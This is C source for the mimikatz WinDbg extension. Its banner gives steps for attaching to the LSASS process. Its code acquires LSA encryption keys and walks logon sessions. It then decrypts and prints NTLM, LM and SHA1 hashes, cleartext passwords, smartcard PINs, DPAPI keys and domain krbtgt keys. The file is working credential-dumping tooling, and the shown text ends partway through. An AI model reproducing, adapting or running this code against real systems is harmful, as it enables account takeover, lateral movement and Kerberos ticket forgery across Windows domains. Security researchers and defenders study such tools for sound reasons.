/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kwindbg.h"

WINDBG_EXTENSION_APIS ExtensionApis = {0};
EXT_API_VERSION g_ExtApiVersion = {5 , 5 ,
#ifdef _M_X64
	EXT_API_VERSION_NUMBER64
#elif defined _M_IX86
	EXT_API_VERSION_NUMBER32
#endif
, 0};
USHORT NtBuildNumber = 0;

LPEXT_API_VERSION WDBGAPI kdbg_ExtensionApiVersion(void)
{
	return &g_ExtApiVersion;
}

VOID WDBGAPI kdbg_WinDbgExtensionDllInit(PWINDBG_EXTENSION_APIS lpExtensionApis, USHORT usMajorVersion, USHORT usMinorVersion)
{
	ExtensionApis = *lpExtensionApis;
	NtBuildNumber = usMinorVersion;
	
	dprintf("\n"
		"  .#####.   " MIMIKATZ_FULL_A "\n"
		" .## ^ ##.  " MIMIKATZ_SECOND_A " - Windows build %hu\n"
		" ## / \\ ##  /* * *\n"
		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n"
		"  '#####'                                  WinDBG extension ! * * */\n\n"
		"===================================\n"
		"#         * Kernel mode *         #\n"
		"===================================\n"
		"# Search for LSASS process\n"
		"0: kd> !process 0 0 lsass.exe\n"
		"# Then switch to its context\n"
		"0: kd> .process /r /p <EPROCESS address>\n"
		"# And finally :\n"
		"0: kd> !mimikatz\n"
		"===================================\n"
		"#          * User mode *          #\n"
		"===================================\n"
		"0:000> !mimikatz\n"
		"===================================\n\n" , NtBuildNumber);
}

const char * KUHL_M_SEKURLSA_LOGON_TYPE[] = {
	"UndefinedLogonType", "Unknown !", "Interactive", "Network",
	"Batch", "Service", "Proxy", "Unlock", "NetworkCleartext",
	"NewCredentials", "RemoteInteractive", "CachedInteractive",
	"CachedRemoteInteractive", "CachedUnlock",
};

KUHL_M_SEKURLSA_PACKAGE packages[] = {
	{"msv",			NULL,									0, kuhl_m_sekurlsa_enum_logon_callback_msv},
	{"tspkg",		"tspkg!TSGlobalCredTable",				0, kuhl_m_sekurlsa_enum_logon_callback_tspkg},
	{"wdigest",		"wdigest!l_LogSessList",				0, kuhl_m_sekurlsa_enum_logon_callback_wdigest},
	{"livessp",		"livessp!LiveGlobalLogonSessionList",	0, kuhl_m_sekurlsa_enum_logon_callback_livessp},
	{"kerberos",	"kerberos!KerbGlobalLogonSessionTable",	0, kuhl_m_sekurlsa_enum_logon_callback_kerberos},
	{"ssp",			"msv1_0!SspCredentialList",				0, kuhl_m_sekurlsa_enum_logon_callback_ssp},
	{"masterkey",	"lsasrv!g_MasterKeyCacheList",			0, kuhl_m_sekurlsa_enum_logon_callback_masterkeys},
	{"masterkey",	"dpapisrv!g_MasterKeyCacheList",		0, kuhl_m_sekurlsa_enum_logon_callback_masterkeys},
	{"credman",		NULL,									0, kuhl_m_sekurlsa_enum_logon_callback_credman},
};

const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonServer)},
	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
};

DECLARE_API(kdbg_coffee)
{
	dprintf("\n    ( (\n     ) )\n  .______.\n  |      |]\n  \\      /\n   `----'\n");
}

DECLARE_API(kdbg_mimikatz)
{
	ULONG_PTR pInitializationVector = 0, phAesKey = 0, ph3DesKey = 0, pLogonSessionList = 0, pLogonSessionListCount = 0, pSecData = 0, pDomainList = 0;
	PLIST_ENTRY LogonSessionList;
	ULONG LogonSessionListCount, i, j;
	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
	const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
	PBYTE buffer;
	DUAL_KRBTGT dualKrbtgt = {NULL, NULL};

	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_7)
		helper = &lsassEnumHelpers[0];
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_8)
		helper = &lsassEnumHelpers[1];
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
		helper = &lsassEnumHelpers[3];
	else
		helper = &lsassEnumHelpers[4];

	if((NtBuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (NtBuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (GetExpression("lsasrv!LogonSessionLeakList")))
			helper++; // yeah, really, I do that =)

	pInitializationVector = GetExpression("lsasrv!InitializationVector");
	phAesKey = GetExpression("lsasrv!hAesKey");
	ph3DesKey = GetExpression("lsasrv!h3DesKey");

	pLogonSessionList = GetExpression("lsasrv!LogonSessionList");
	pLogonSessionListCount = GetExpression("lsasrv!LogonSessionListCount");

	for(j = 0; j < ARRAYSIZE(packages); j++)
		if(packages[j].symbolName)
			packages[j].symbolPtr = GetExpression(packages[j].symbolName);
	
	if(pSecData = GetExpression("kdcsvc!SecData"))
	{
		dprintf("\nkrbtgt keys\n===========\n");
		if(ReadMemory(pSecData + SECDATA_KRBTGT_OFFSET*sizeof(PVOID), &dualKrbtgt, 2*sizeof(PVOID), NULL))
		{
			kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_current, "Current");
			kuhl_m_sekurlsa_krbtgt_keys(dualKrbtgt.krbtgt_previous, "Previous");
		}
	}
#ifdef _M_X64
	if(pDomainList = GetExpression("kdcsvc!KdcDomainList"))
	{
		dprintf("\nDomain List\n===========\n");
		kuhl_m_sekurlsa_krbtgt_trust(pDomainList);
	}
#endif
	kuhl_sekurlsa_dpapi_backupkeys();

	dprintf("\nSekurLSA\n========\n");
	if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_init()))
	{
		if(pInitializationVector && phAesKey && ph3DesKey)
		{
			if(NT_SUCCESS(kuhl_m_sekurlsa_nt6_acquireKeys(pInitializationVector, phAesKey, ph3DesKey)))
			{
				if(pLogonSessionListCount && pLogonSessionList)
				{
					if(ReadMemory(pLogonSessionListCount, &LogonSessionListCount, sizeof(ULONG), NULL))
					{
						if(LogonSessionList = (PLIST_ENTRY) LocalAlloc(LPTR, sizeof(LIST_ENTRY) * LogonSessionListCount))
						{
							if(ReadMemory(pLogonSessionList, LogonSessionList, sizeof(LIST_ENTRY) * LogonSessionListCount, NULL))
							{
								if(buffer = (PBYTE) LocalAlloc(LPTR, helper->tailleStruct))
								{
									for(i = 0; i < LogonSessionListCount; i++)
									{
										*(PVOID *) (buffer) = LogonSessionList[i].Flink;
										while(pLogonSessionList + (i * sizeof(LIST_ENTRY)) != (ULONG_PTR) *(PVOID *) (buffer))
										{
											if(ReadMemory((ULONG_PTR) *(PVOID *) (buffer), buffer, helper->tailleStruct, NULL))
											{
												sessionData.LogonId		= (PLUID)			(buffer + helper->offsetToLuid);
												sessionData.LogonType	= *((PULONG)		(buffer + helper->offsetToLogonType));
												sessionData.Session		= *((PULONG)		(buffer + helper->offsetToSession));
												sessionData.UserName	= (PUNICODE_STRING) (buffer + helper->offsetToUsername);
												sessionData.LogonDomain	= (PUNICODE_STRING) (buffer + helper->offsetToDomain);
												sessionData.pCredentials= *(PVOID *)		(buffer + helper->offsetToCredentials);
												sessionData.pSid		= *(PSID *)			(buffer + helper->offsetToPSid);
												sessionData.pCredentialManager = *(PVOID *) (buffer + helper->offsetToCredentialManager);
												sessionData.LogonTime	= *((PFILETIME)		(buffer + helper->offsetToLogonTime));
												sessionData.LogonServer	= (PUNICODE_STRING) (buffer + helper->offsetToLogonServer);

												if((sessionData.LogonType != Network) /*&& (sessionData.LogonType != UndefinedLogonType)*/)
												{
													kull_m_string_getDbgUnicodeString(sessionData.UserName);
													kull_m_string_getDbgUnicodeString(sessionData.LogonDomain);
													kull_m_string_getDbgUnicodeString(sessionData.LogonServer);
													kuhl_m_sekurlsa_utils_getSid(&sessionData.pSid);
													dprintf("\nAuthentication Id : %u ; %u (%08x:%08x)\n"
														"Session           : %s from %u\n"
														"User Name         : %wZ\n"
														"Domain            : %wZ\n"
														"Logon Server      : %wZ\n"
														, sessionData.LogonId->HighPart, sessionData.LogonId->LowPart, sessionData.LogonId->HighPart, sessionData.LogonId->LowPart
														, KUHL_M_SEKURLSA_LOGON_TYPE[sessionData.LogonType], sessionData.Session
														, sessionData.UserName, sessionData.LogonDomain, sessionData.LogonServer);
													
													dprintf("Logon Time        : ");
													kull_m_string_displayLocalFileTime(&sessionData.LogonTime);
													dprintf("\n");

													dprintf("SID               : ");
													if(sessionData.pSid)
														kull_m_string_displaySID(sessionData.pSid);
													dprintf("\n");

													LocalFree(sessionData.UserName->Buffer);
													LocalFree(sessionData.LogonDomain->Buffer);
													LocalFree(sessionData.LogonServer->Buffer);
													LocalFree(sessionData.pSid);

													for(j = 0; j < ARRAYSIZE(packages); j++)
														if(packages[j].symbolPtr || !packages[j].symbolName)
														{
															dprintf("\t%s : ", packages[j].name);
															packages[j].callback(packages[j].symbolPtr, &sessionData);
															dprintf("\n");
														}
												}
											}
											else break;
										}
									}
									LocalFree(buffer);
								}
							}
							LocalFree(LogonSessionList);
						}
					}
				}
				else dprintf("[ERROR] [LSA] Symbols\n%p - lsasrv!LogonSessionListCount\n%p - lsasrv!LogonSessionList\n", pLogonSessionListCount, pLogonSessionList);
			}
			else dprintf("[ERROR] [CRYPTO] Acquire keys\n");
		}
		else dprintf("[ERROR] [CRYPTO] Symbols\n%p - lsasrv!InitializationVector\n%p - lsasrv!hAesKey\n%p - lsasrv!h3DesKey\n", pInitializationVector, phAesKey, ph3DesKey);
		kuhl_m_sekurlsa_nt6_LsaCleanupProtectedMemory();
	}
	else dprintf("[ERROR] [CRYPTO] Init\n");
}

UNICODE_STRING uNull = {12, 14, L"(null)"};
VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags)
{
	PUNICODE_STRING username = NULL, domain = NULL, password = NULL;
	PKIWI_CREDENTIAL_KEYS pKeys = NULL;
	PKERB_HASHPASSWORD_GENERIC pHashPassword;
	UNICODE_STRING buffer;
	DWORD type, i;
	BOOL isNull = FALSE;
	PBYTE msvCredentials;
	const MSV1_0_PRIMARY_HELPER * pMSVHelper;
	PLSAISO_DATA_BLOB blob = NULL;

	if(mesCreds)
	{
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
		{
			type = flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK;
			if(msvCredentials = (PBYTE) ((PUNICODE_STRING) mesCreds)->Buffer)
			{
				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
					kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length);
				
				switch(type)
				{
				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
					pMSVHelper = kuhl_m_sekurlsa_msv_helper();
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain), FALSE);
					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), FALSE);
					dprintf("\n\t * Username : %wZ\n\t * Domain   : %wZ", (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain));
					if(!pMSVHelper->offsetToisIso || !*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisIso))
					{
						if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisLmOwfPassword))
						{
							dprintf("\n\t * LM       : ");
							kull_m_string_dprintf_hex(msvCredentials + pMSVHelper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
						}
						if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword))
						{
							dprintf("\n\t * NTLM     : ");
							kull_m_string_dprintf_hex(msvCredentials + pMSVHelper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
						}
						if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword))
						{
							dprintf("\n\t * SHA1     : ");
							kull_m_string_dprintf_hex(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH, 0);
						}
						if(pMSVHelper->offsetToisDPAPIProtected && *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisDPAPIProtected))
						{
							dprintf("\n\t * DPAPI    : ");
							kull_m_string_dprintf_hex(msvCredentials + pMSVHelper->offsetToDPAPIProtected + 6, LM_NTLM_HASH_LENGTH, 0); // 020000000000
						}
					}
					else
					{
						i = *(PUSHORT) (msvCredentials + pMSVHelper->offsetToIso);
						if(NtBuildNumber >= KULL_M_WIN_BUILD_10_1607)
						{
							//dprintf("\n\t   * unkSHA1: ");
							//kull_m_string_dprintf_hex(msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT), SHA_DIGEST_LENGTH, 0);	
							msvCredentials += SHA_DIGEST_LENGTH;
						}
						if((i == (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("NtlmHash") - 1) + 2*LM_NTLM_HASH_LENGTH + SHA_DIGEST_LENGTH)) ||
							i == (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("NtlmHash") - 1) + 3*LM_NTLM_HASH_LENGTH + SHA_DIGEST_LENGTH))
							kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)));
						else
							kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)), i);
					}
					break;
				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
					if(kull_m_rpc_DecodeCredentialKeys(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, &pKeys))
					{
						for(i = 0; i < pKeys->count; i++)
							kuhl_m_sekurlsa_genericKeyOutput(&pKeys->keys[i]);
						kull_m_rpc_FreeCredentialKeys(&pKeys);
					}
					break;
				default:
					dprintf("\n\t * Raw data : ");
					kull_m_string_dprintf_hex(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, 1);
				}
			}
		}
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE)
		{
			dprintf("\n\t * Smartcard"); 
			if(mesCreds->UserName.Buffer)
			{
				if(kull_m_string_getDbgUnicodeString(&mesCreds->UserName))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(mesCreds->UserName.Buffer, mesCreds->UserName.MaximumLength);
					dprintf("\n\t     PIN code : %wZ", &mesCreds->UserName);
					LocalFree(mesCreds->UserName.Buffer);
				}
			}
			if(mesCreds->Domaine.Buffer)
			{
				dprintf(
					"\n\t     Model    : %S"
					"\n\t     Reader   : %S"
					"\n\t     Key name : %S"
					"\n\t     Provider : %S",
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[0],
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[1],
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[2],
					(PBYTE) mesCreds->Domaine.Buffer + 4 * sizeof(DWORD) + sizeof(wchar_t) * ((PDWORD) mesCreds->Domaine.Buffer)[3]
				);
			}
		}
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
		{
			pHashPassword = (PKERB_HASHPASSWORD_GENERIC) mesCreds;
			dprintf("\t   %s ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
			if(buffer.Length = buffer.MaximumLength = (USHORT) pHashPassword->Size)
			{
				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
				if(kull_m_string_getDbgUnicodeString(&buffer))
				{
					if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10) && (pHashPassword->Size > (DWORD) FIELD_OFFSET(LSAISO_DATA_BLOB, data)))
					{
						if(pHashPassword->Size <= (FIELD_OFFSET(LSAISO_DATA_BLOB, data) + (sizeof("KerberosKey") - 1) + AES_256_KEY_LENGTH)) // usual ISO DATA BLOB for Kerberos AES 256 session key
							kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) buffer.Buffer);
						else
							kuhl_m_sekurlsa_genericEncLsaIsoOutput((PENC_LSAISO_DATA_BLOB) buffer.Buffer, (DWORD) pHashPassword->Size);
					}
					else
					{
						if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
							kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(buffer.Buffer, buffer.MaximumLength);
						kull_m_string_dprintf_hex(buffer.Buffer, buffer.Length, 0);
					}
					LocalFree(buffer.Buffer);
				}
			}
			else dprintf("<no size, buffer is incorrect>");
			dprintf("\n");
		}
		else
		{
			if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10)
				mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL) mesCreds)->Password;
			else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607)
			{
				switch(((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->type)
				{
				case 1:
					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
					mesCreds->Password.Buffer = NULL;
					buffer.Length = buffer.MaximumLength = (USHORT) ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->IsoPassword.StructSize;
					buffer.Buffer = (PWSTR) ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->IsoPassword.isoBlob;
					if(kull_m_string_getDbgUnicodeString(&buffer))
						blob = (PLSAISO_DATA_BLOB) buffer.Buffer;
					//break;
				case 0:
					// no creds
					mesCreds->Password.Length = mesCreds->Password.MaximumLength = 0;
					mesCreds->Password.Buffer = NULL;
					break;
				case 2:
					mesCreds->Password = ((PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) mesCreds)->Password;
					break;
				default:
					dprintf("Unknown version in Kerberos credentials structure\n");
				}
			}

			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
			{
				if(kull_m_string_getDbgUnicodeString(&mesCreds->UserName) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						username = &mesCreds->UserName;
					else
						domain = &mesCreds->UserName;
				}
				if(kull_m_string_getDbgUnicodeString(&mesCreds->Domaine) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						domain = &mesCreds->Domaine;
					else
						username = &mesCreds->Domaine;
				}
				if(kull_m_string_getDbgUnicodeString(&mesCreds->Password) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
					password = &mesCreds->Password;
				}

				if(password || !(flags & KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY))
				{
					dprintf((flags & KUHL_SEKURLSA_CREDS_DISPLAY_LINE) ?
						"%wZ\t%wZ\t"
						:
						"\n\t * Username : %wZ"
						"\n\t * Domain   : %wZ"
						"\n\t * Password : "
						, username ? username : &uNull, domain ? domain : &uNull);

					if(!password || kull_m_string_suspectUnicodeString(password))
					{
						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
							dprintf("%.*S", password->Length / sizeof(wchar_t), password->Buffer);
						else
							dprintf("%wZ", password ? password : &uNull);
					}
					else kull_m_string_dprintf_hex(password->Buffer, password->Length, 1);

					if(blob)
					{
						kuhl_m_sekurlsa_genericLsaIsoOutput(blob);
						LocalFree(blob);
					}
				}

				if(username)
					LocalFree(username->Buffer);
				if(domain)
					LocalFree(domain->Buffer);
				if(password)
					LocalFree(password->Buffer);
			}
		}
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
			dprintf("\n");
	}
	else dprintf("LUID KO\n");
}

VOID kuhl_m_sekurlsa_genericKeyOutput(PKIWI_CREDENTIAL_KEY key)
{
	switch(key->type)
	{
	case CREDENTIALS_KEY_TYPE_NTLM:
		dprintf("\n\t * NTLM     : ");
		break;
	case CREDENTIALS_KEY_TYPE_SHA1:
		dprintf("\n\t * SHA1     : ");
		break;
	case CREDENTIALS_KEY_TYPE_ROOTKEY:
		dprintf("\n\t * RootKey  : ");
		break;
	case CREDENTIALS_KEY_TYPE_DPAPI_PROTECTION:
		dprintf("\n\t * DPAPI    : ");
		break;
	default:
		dprintf("\n\t * %08x : ", key->type);
	}
	kull_m_string_dprintf_hex(key->pbData, key->cbData, 0);
}

VOID kuhl_m_sekurlsa_genericLsaIsoOutput(PLSAISO_DATA_BLOB blob)
{
	dprintf("\n\t   * LSA Isolated Data: %.*s", blob->typeSize, blob->data);
	dprintf("\n\t     Unk-Key  : "); kull_m_string_dprintf_hex(blob->unkKeyData, sizeof(blob->unkKeyData), 0);
	dprintf("\n\t     Encrypted: "); kull_m_string_dprintf_hex(blob->data + blob->typeSize, blob->origSize, 0);
	dprintf("\n\t\t   SS:%u, TS:%u, DS:%u", blob->structSize, blob->typeSize, blob->origSize);
	dprintf("\n\t\t   0:0x%x, 1:0x%x, 2:0x%x, 3:0x%x, 4:0x%x, E:", blob->unk0, blob->unk1, blob->unk2, blob->unk3, blob->unk4);
	kull_m_string_dprintf_hex(blob->unkData2, sizeof(blob->unkData2), 0); dprintf(", 5:0x%x", blob->unk5);
}

VOID kuhl_m_sekurlsa_genericEncLsaIsoOutput(PENC_LSAISO_DATA_BLOB blob, DWORD size)
{
	dprintf("\n\t   * unkData1 : "); kull_m_string_dprintf_hex(blob->unkData1, sizeof(blob->unkData1), 0);
	dprintf("\n\t     unkData2 : "); kull_m_string_dprintf_hex(blob->unkData2, sizeof(blob->unkData2), 0);
	dprintf("\n\t     Encrypted: "); kull_m_string_dprintf_hex(blob->data, size - FIELD_OFFSET(ENC_LSAISO_DATA_BLOB, data), 0);
}

void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, LPCSTR prefix)
{
	DWORD sizeForCreds, i;
	KIWI_KRBTGT_CREDENTIALS_64 tmpCred64, *creds64;
	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
	PVOID buffer;

	if(addr)
	{
		dprintf("\n%s krbtgt: ", prefix);
		if(NtBuildNumber < KULL_M_WIN_BUILD_10_1607)
		{
			if(ReadMemory((ULONG_PTR) addr, &tmpCred6, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6), NULL))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
				if(creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) LocalAlloc(LPTR, sizeForCreds))
				{
					if(ReadMemory((ULONG_PTR) addr, creds6, sizeForCreds, NULL))
					{
						dprintf("%u credentials\n", creds6->cbCred);
						for(i = 0; i < creds6->cbCred; i++)
						{
							dprintf("\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds6->credentials[i].type)));
							if(buffer = LocalAlloc(LPTR, PtrToUlong(creds6->credentials[i].size)))
							{
								if(ReadMemory((ULONG_PTR) creds6->credentials[i].key, buffer, PtrToUlong(creds6->credentials[i].size), NULL))
									kull_m_string_dprintf_hex(buffer, PtrToUlong(creds6->credentials[i].size), 0);
								LocalFree(buffer);
							}
							dprintf("\n");
						}
					}
					LocalFree(creds6);
				}
			}
		}
		else
		{
			if(ReadMemory((ULONG_PTR) addr, &tmpCred64, sizeof(KIWI_KRBTGT_CREDENTIALS_64) - sizeof(KIWI_KRBTGT_CREDENTIAL_64), NULL))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_64) + (tmpCred64.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_64);
				if(creds64 = (PKIWI_KRBTGT_CREDENTIALS_64) LocalAlloc(LPTR, sizeForCreds))
				{
					if(ReadMemory((ULONG_PTR) addr, creds64, sizeForCreds, NULL))
					{
						dprintf("%u credentials\n", creds64->cbCred);
						for(i = 0; i < creds64->cbCred; i++)
						{
							dprintf("\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds64->credentials[i].type)));
							if(buffer = LocalAlloc(LPTR, PtrToUlong(creds64->credentials[i].size)))
							{
								if(ReadMemory((ULONG_PTR) creds64->credentials[i].key, buffer, PtrToUlong(creds64->credentials[i].size), NULL))
									kull_m_string_dprintf_hex(buffer, PtrToUlong(creds64->credentials[i].size), 0);
								LocalFree(buffer);
							}
							dprintf("\n");
						}
					}
					LocalFree(creds64);
				}
			}
		}
	}
}

#ifdef _M_X64
